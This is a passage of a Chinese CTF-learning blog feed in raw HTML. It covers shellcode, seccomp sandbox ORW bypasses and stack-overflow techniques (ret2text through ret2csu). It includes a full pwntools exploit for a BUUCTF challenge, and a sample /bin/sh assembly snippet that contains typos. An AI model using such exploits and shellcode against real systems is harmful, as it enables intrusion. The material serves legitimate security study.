rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2025/01/26/shellcode/"/>
    <url>/2025/01/26/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell</li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,mov rax, 0x68732f6e69622f ;这里后面那一大串是/bin/sh<br>push rax<br>mov rdi,rsp    ;这两行使rdi指向/bin/sh<br>mov esi,0<br>mov edo,0<br>mov rax,0x3b<br>int 0x80<br></code></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read_flag=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi,rax;</span><br><span class="hljs-string">mov rsi,rsp;</span><br><span class="hljs-string">......</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(read_flag)<br></code></pre></td></tr></table></figure><h1 id="沙盒下的orw绕过"><a href="#沙盒下的orw绕过" class="headerlink" title="沙盒下的orw绕过"></a>沙盒下的orw绕过</h1><h2 id="沙箱保护"><a href="#沙箱保护" class="headerlink" title="沙箱保护"></a>沙箱保护</h2><ul><li>对程序加入的一些保护，最常见的是禁用一些系统调用，比如exceve，使我们不可通过系统调用获取到权限，因此只能通过<strong>ROP的方式调用open,read,write</strong>等来读取并打印flag内同</li></ul><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>就是open, read,write简写，就是打开，写入，输出flag</p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>利用seccomp-tools查看是否开启了沙箱，以及沙箱中一些允许的syscall</p><p>安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gcc ruby-dev<br>gem <span class="hljs-keyword">install</span> seccomp-tools<br></code></pre></td></tr></table></figure><p>检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h2 id="开启沙箱"><a href="#开启沙箱" class="headerlink" title="开启沙箱"></a>开启沙箱</h2><h3 id="prctl-函数调用"><a href="#prctl-函数调用" class="headerlink" title="prctl()函数调用"></a>prctl()函数调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// 主要关注prctl()函数的第一个参数，也就是option,设定的option的值的不同导致黑名单不同，介绍2个比较重要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则 禁用execve系统调用 且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure></li></ul><h3 id="seccomp-系统调用"><a href="#seccomp-系统调用" class="headerlink" title="seccomp()系统调用"></a>seccomp()系统调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)</span><br>  <span class="hljs-comment">// seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</span><br>  v1 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// seccomp_rule_add添加规则</span><br>  <span class="hljs-comment">// v1对应上面初始化的返回值</span><br>  <span class="hljs-comment">// 0x7fff0000即对应宏SCMP_ACT_ALLOW</span><br>  <span class="hljs-comment">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>  <span class="hljs-comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制</span><br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">60LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">231LL</span>, <span class="hljs-number">0LL</span>);<br><br>  <span class="hljs-comment">// seccomp_load-&gt;将当前seccomp过滤器加载到内核中</span><br>  <span class="hljs-keyword">if</span> ( seccomp_load(v1) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-comment">// seccomp_release-&gt;释放seccomp过滤器状态</span><br>    <span class="hljs-comment">// 但对已经load的过滤规则不影响</span><br>    seccomp_release(v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="shellcode的写入"><a href="#shellcode的写入" class="headerlink" title="shellcode的写入"></a>shellcode的写入</h2><p>一般溢出的大小不够写入很长的ROP链，因此提供mmap()函数，从而给出一段栈上的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offsize)</span>; <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *mmap&#123;<br>    <span class="hljs-type">void</span> *addr; <span class="hljs-comment">//映射区首地址，传NULL</span><br>    <span class="hljs-type">size_t</span> length; <span class="hljs-comment">//映射区大小</span><br>    <span class="hljs-comment">//会自动调为4k的整数倍</span><br>    <span class="hljs-comment">//不能为0</span><br>    <span class="hljs-comment">//一般文件多大，length就指定多大</span><br>    <span class="hljs-type">int</span> prot; <span class="hljs-comment">//映射区权限</span><br>    <span class="hljs-comment">//PROT_READ 映射区必须要有读权限</span><br>    <span class="hljs-comment">//PROT_WRITE</span><br>    <span class="hljs-comment">//PROT_READ | PROT_WRITE</span><br>    <span class="hljs-type">int</span> flags; <span class="hljs-comment">//标志位参数</span><br>    <span class="hljs-comment">//MAP_SHARED 修改内存数据会同步到磁盘</span><br>    <span class="hljs-comment">//MAP_PRIVATE 修改内存数据不会同步到磁盘</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">//要映射文件所对应的文件描述符</span><br>    <span class="hljs-type">off_t</span> offset; <span class="hljs-comment">//映射文件的偏移量，从文件哪个位置开始</span><br>    <span class="hljs-comment">//映射的时候文件指针的偏移量</span><br>    <span class="hljs-comment">//必须是4k的整数倍</span><br>    <span class="hljs-comment">//一般设为0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737913055216.png" alt="参数"></p><p>比如说</p><p><code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><ol><li><strong><code>addr</code></strong>: <code>(void *)0x123000</code><ul><li>这是请求映射的起始地址。<code>0x123000</code> 是一个具体的地址值。如果 <code>mmap</code> 调用成功，内核会尝试将内存映射到这个地址。如果地址不可用，内核会选择一个合适的地址。</li></ul></li><li><strong><code>length</code></strong>: <code>0x1000uLL</code><ul><li>这是请求映射的内存区域的长度，单位是字节。<code>0x1000</code> 是 16 进制表示，等于 4096 字节（1 页）。</li></ul></li><li><strong><code>prot</code></strong>: <code>6</code><ul><li>这是内存区域的保护标志，定义了对该区域的访问权限。<code>6</code> 是 <code>PROT_READ | PROT_WRITE</code> 的组合，表示该区域可以读写。</li></ul></li><li><strong><code>flags</code></strong>: <code>34</code><ul><li>这是映射的标志，定义了映射的类型和行为。<code>34</code> 是 <code>MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS</code> 的组合，具体含义如下：<ul><li><code>MAP_PRIVATE</code>: 创建一个私有映射，对映射区域的修改不会反映到原始文件中。</li><li><code>MAP_FIXED</code>: 强制使用指定的地址 <code>addr</code>，如果该地址不可用，调用会失败。</li><li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射，不与任何文件关联。</li></ul></li></ul></li><li><strong><code>fd</code></strong>: <code>-1</code><ul><li>这是文件描述符，用于指定映射的文件。<code>-1</code> 表示不映射任何文件，通常与 <code>MAP_ANONYMOUS</code> 一起使用。</li></ul></li><li><strong><code>offset</code></strong>: <code>0LL</code><ul><li>这是文件中的偏移量，用于指定映射的起始位置。<code>0LL</code> 表示从文件的开头开始映射。</li></ul></li></ol><p>orw绕过就是open flag，将flag写入某个区域，再write出来</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h3><p> <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">BUUCTF在线评测</a> </p><p>checksec</p><p>懒得放截图了，反正64位什么都没开</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992637686.png" alt="seccomp-tools"></p><p>只允许read,write,open系统调用</p><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992793323.png" alt="main"></p><p>可以看到从0x123000给分配了0x1000字节空间，权限可写可执行</p><p>直接看第三个函数</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992758135.png" alt="第三个"></p><p>存在栈溢出，但长度小</p><ul><li><p>思路：</p><p>在mmap分配的区域进行orw，并且在这个区域写入flag并输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><span class="hljs-comment"># 写在mmap+0x100的地方</span><br><span class="hljs-comment"># orw写在mmap来执行</span><br></code></pre></td></tr></table></figure><p>现在的问题是如何让rip指向那一块区域</p><p>发现程序有一个<code>jmp rsp</code>可以利用</p><p>那么我们可以构造栈</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993374830.png" alt="栈"></p></li></ul><p>因为函数结束是有<code>leave;ret</code>leave让rsp跑到了序号2（rbp）位置，rbp跑走了，然后ret再让rsp再移动到序号1的位置，此时与read相距0x28+8&#x3D;0x30<br>所以是<code>sub rsp,0x30</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>完整：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bad&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29724</span>)<br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!\n&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><br>orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br>r.sendline(payload)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.sendline(orw)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>成功得到</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993658927.png" alt="^^"></p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理： 利用危险函数，将返回地址填充到栈帧上的返回地址，从<strong>控制该函数结束时返回到的地方</strong></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h1 id="初级栈溢出"><a href="#初级栈溢出" class="headerlink" title="初级栈溢出"></a>初级栈溢出</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>利用<code>.text</code>段中的代码</p><p>确定填充长度后   构造payload即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul><li><p>shellcode</p><p>控制程序执行shellcode代码，常见功能是获取目标系统的shell，我们需向<strong>内存中填充一些可执行的代码</strong></p><p>意味着，<strong>shellcode所在区域需要有可执行的权限</strong></p></li><li><p>原理：</p><p>我们向可执行的区域写入shellcode，然后执行即可</p></li><li><p>pwntools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>一键生成shellcode</p></li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul><li><p>原理：</p><p>利用系统调用获取shell</p></li><li><p>系统调用知识补充：</p><p>跟函数没什么区别，不过我们所调用的函数是系统给的罢了</p><p><strong>系统调用号：rax</strong></p><p><strong>前6个参数：rdi rsi rdx r10 r8 r9</strong></p><ul><li><p>系统调用号</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x1.png" alt="32位"><br>                                                   <strong>32位</strong><br><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x2.png" alt="64位"><br>                                                   <strong>64位</strong></p></li></ul></li><li><p>ret2syscall</p><ul><li><p>寻找gadgets来控制寄存器为特定的值从而执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>工具：<code>ROPgadget --binary 可执行文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p></li></ul></li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul><li><p>.plt与.got</p><p> <a href="https://blog.csdn.net/2301_80976241/article/details/144333148?ops_request_misc=%7B%22request_id%22:%22990dac9d47abe207078a2f01ce0ce74f%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=990dac9d47abe207078a2f01ce0ce74f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144333148-null-null.142%5Ev101%5Epc_search_result_base9&utm_term=plt%E4%B8%8Egot&spm=1018.2226.3001.4187">简单聊聊PLT和GOT_plt与got-CSDN博客</a> </p><p><strong>PLT（Procedure Linkage Table）</strong></p><p>PLT 是一个<strong>跳转表</strong>，跳转到got表，从而执行函数</p><p><strong>工作原理:</strong></p><p>当程序第一次调用共享库中的函数时，会通过 PLT 跳转到一个 stub 代码段。这个 stub 会将控制权转移到动态链接器(ld.so),动态链接器会在 GOT 中查找或解析目标函数的实际地址，<strong>然后更新 GOT 的对应条目</strong>,之后，<strong>再次调用同一函数时，PLT 会直接从 GOT 中读取已解析的地址并跳转到目标函数</strong>。</p><p><strong>GOT（Global Offset Table）</strong></p><p>GOT 是一个表，<strong>存储程序运行时需要使用的全局变量和函数的实际地址。</strong></p><p><strong>工作原理:</strong></p><p>程序加载时，GOT 的条目中存储的是共享库函数的默认入口地址（通常指向 PLT 中的 stub），当动态链接器解析了实际的函数地址后，<strong>会更新 GOT 对应的条目，使其指向正确的目标函数</strong>，之后，主程序对函数的调用直接通过 GOT 获取实际地址，提高效率。</p><p>也就是说，<strong>在使用一次函数后，got内存储的是真实地址</strong></p><p><strong>PLT 和 GOT协同找到正确的函数地址</strong><br>工作流程： 首先主程序中所有对共享库函数的调用，<strong>都会经过 PLT 跳转</strong>。然后PLT 中的第一跳通常指向 GOT 表中的一项。此时GOT 中的条目在未解析时会指向 PLT 中的 stub 地址，动态链接器负责更新 GOT 条目。解析完成后，<strong>GOT 保存目标函数的真实地址</strong>，后续调用直接通过 GOT 加快速度。</p></li><li><p>ret2libc</p><p>也就是利用libc中的system函数和&#x2F;bin&#x2F;sh的地址获取目标系统shell</p><p>利用泄露已知函数的真实地址，计算libc基地址，从而得到system与&#x2F;bin&#x2F;sh的真实地址，从而得到shell</p></li></ul><h1 id="中级栈溢出"><a href="#中级栈溢出" class="headerlink" title="中级栈溢出"></a>中级栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>在64位程序中，前6个参数由寄存器传递，但大多数时候，难找到每一个寄存器的gadgets，这时可以利用_libc_csu_csu中的gadgets</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004005</span>C0 ; <span class="hljs-type">void</span> _libc_csu_init(<span class="hljs-type">void</span>)<br>.text:<span class="hljs-number">00000000004005</span>C0                 public __libc_csu_init<br>.text:<span class="hljs-number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>o<br>.text:<span class="hljs-number">00000000004005</span>C0                 push    r15<br>.text:<span class="hljs-number">00000000004005</span>C2                 push    r14<br>.text:<span class="hljs-number">00000000004005</span>C4                 mov     r15d, edi<br>.text:<span class="hljs-number">00000000004005</span>C7                 push    r13<br>.text:<span class="hljs-number">00000000004005</span>C9                 push    r12<br>.text:<span class="hljs-number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:<span class="hljs-number">00000000004005</span>D2                 push    rbp<br>.text:<span class="hljs-number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">00000000004005</span>DA                 push    rbx<br>.text:<span class="hljs-number">00000000004005</span>DB                 mov     r14, rsi<br>.text:<span class="hljs-number">00000000004005</span>DE                 mov     r13, rdx<br>.text:<span class="hljs-number">00000000004005E1</span>                 sub     rbp, r12<br>.text:<span class="hljs-number">00000000004005E4</span>                 sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004005E8</span>                 sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004005</span>EC                 call    _init_proc<br>.text:<span class="hljs-number">00000000004005F</span>1                 test    rbp, rbp<br>.text:<span class="hljs-number">00000000004005F</span>4                 jz      <span class="hljs-type">short</span> loc_400616<br>.text:<span class="hljs-number">00000000004005F</span>6                 xor     ebx, ebx<br>.text:<span class="hljs-number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400600</span><br>.text:<span class="hljs-number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>j<br><span class="hljs-comment">//主要利用以下模块</span><br>.text:<span class="hljs-number">0000000000400600</span>                 mov     rdx, r13<br>.text:<span class="hljs-number">0000000000400603</span>                 mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400606</span>                 mov     edi, r15d<br>.text:<span class="hljs-number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000040060</span>D                 add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400611</span>                 cmp     rbx, rbp<br>.text:<span class="hljs-number">0000000000400614</span>                 jnz     <span class="hljs-type">short</span> loc_400600<br>.text:<span class="hljs-number">0000000000400616</span><br>.text:<span class="hljs-number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>j<br>.text:<span class="hljs-number">0000000000400616</span>                 add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040061</span>A                 pop     rbx<br>.text:<span class="hljs-number">000000000040061B</span>                 pop     rbp<br>.text:<span class="hljs-number">000000000040061</span>C                 pop     r12<br>.text:<span class="hljs-number">000000000040061</span>E                 pop     r13<br>.text:<span class="hljs-number">0000000000400620</span>                 pop     r14<br>.text:<span class="hljs-number">0000000000400622</span>                 pop     r15<br>.text:<span class="hljs-number">0000000000400624</span>                 retn<br>.text:<span 